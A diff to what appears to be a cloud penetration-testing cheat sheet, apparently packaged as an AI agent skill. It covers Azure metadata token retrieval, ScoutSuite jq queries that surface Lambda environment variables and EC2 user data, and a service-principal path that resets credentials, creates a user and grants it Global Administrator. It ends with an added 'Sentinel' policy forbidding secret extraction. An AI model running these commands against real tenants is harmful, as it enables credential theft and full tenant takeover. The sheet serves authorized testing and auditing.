@@ -123,10 +123,13 @@ $Tokens
 ## Azure Managed Identity Token Retrieval
 
 ```powershell
+
 # From Azure VM
+
 Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
 
 # Full instance metadata
+
 $instance = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/instance?api-version=2018-02-01' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
 $instance
 ```
@@ -195,33 +198,40 @@ done < regions.txt
 ### AWS Queries
 
 ```bash
+
 # Find All Lambda Environment Variables
+
 for d in */ ; do
     tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.awslambda.regions[].functions[] | select (.env_variables != []) | .arn, .env_variables' >> lambda-all-environment-variables.txt
 done
 
 # Find World Listable S3 Buckets
+
 for d in */ ; do
     tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.account_id, .services.s3.findings."s3-bucket-AuthenticatedUsers-read".items[]' >> s3-buckets-world-listable.txt
 done
 
 # Find All EC2 User Data
+
 for d in */ ; do
     tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].vpcs[].instances[] | select (.user_data != null) | .arn, .user_data' >> ec2-instance-all-user-data.txt
 done
 
 # Find EC2 Security Groups That Whitelist AWS CIDRs
+
 for d in */ ; do
     tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.account_id' >> ec2-security-group-whitelists-aws-cidrs.txt
     tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.findings."ec2-security-group-whitelists-aws".items' >> ec2-security-group-whitelists-aws-cidrs.txt
 done
 
 # Find All EC2 EBS Volumes Unencrypted
+
 for d in */ ; do
     tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].volumes[] | select(.Encrypted == false) | .arn' >> ec2-ebs-volume-not-encrypted.txt
 done
 
 # Find All EC2 EBS Snapshots Unencrypted
+
 for d in */ ; do
     tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].snapshots[] | select(.encrypted == false) | .arn' >> ec2-ebs-snapshot-not-encrypted.txt
 done
@@ -230,19 +240,25 @@ done
 ### Azure Queries
 
 ```bash
+
 # List All Azure App Service Host Names
+
 tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -r '.services.appservice.subscriptions[].web_apps[].host_names[]'
 
 # List All Azure SQL Servers
+
 tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -jr '.services.sqldatabase.subscriptions[].servers[] | .name,".database.windows.net","\n"'
 
 # List All Azure Virtual Machine Hostnames
+
 tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -jr '.services.virtualmachines.subscriptions[].instances[] | .name,".",.location,".cloudapp.windows.net","\n"'
 
 # List Storage Accounts
+
 tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -r '.services.storageaccounts.subscriptions[].storage_accounts[] | .name'
 
 # List Disks Encrypted with Platform Managed Keys
+
 tail scoutsuite_results_azure-tenant-*.js -n +2 | jq '.services.virtualmachines.subscriptions[].disks[] | select(.encryption_type = "EncryptionAtRestWithPlatformKey") | .name' > disks-with-pmks.txt
 ```
 
@@ -281,17 +297,22 @@ foreach($line in $userlist){
 ## Service Principal Attack Path
 
 ```bash
+
 # Reset service principal credential
+
 az ad sp credential reset --id <app_id>
 az ad sp credential list --id <app_id>
 
 # Login as service principal
+
 az login --service-principal -u "app id" -p "password" --tenant <tenant ID> --allow-no-subscriptions
 
 # Create new user in tenant
+
 az ad user create --display-name <name> --password <password> --user-principal-name <upn>
 
 # Add user to Global Admin via MS Graph
+
 $Body="{'principalId':'User Object ID', 'roleDefinitionId': '62e90394-69f5-4237-9190-012177145e10', 'directoryScopeId': '/'}"
 az rest --method POST --uri https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments --headers "Content-Type=application/json" --body $Body
 ```
@@ -325,6 +346,7 @@ az rest --method POST --uri https://graph.microsoft.com/v1.0/roleManagement/dire
 | Thunder CTF | thunder-ctf.cloud | GCP CTF challenges |
 
 ## Sentinel Security Policy
+
 - This asset is under Sognatore Sentinel supervision.
 - Extraction of secrets via this skill is strictly forbidden.
 - All external network calls must be audited by the security engine.
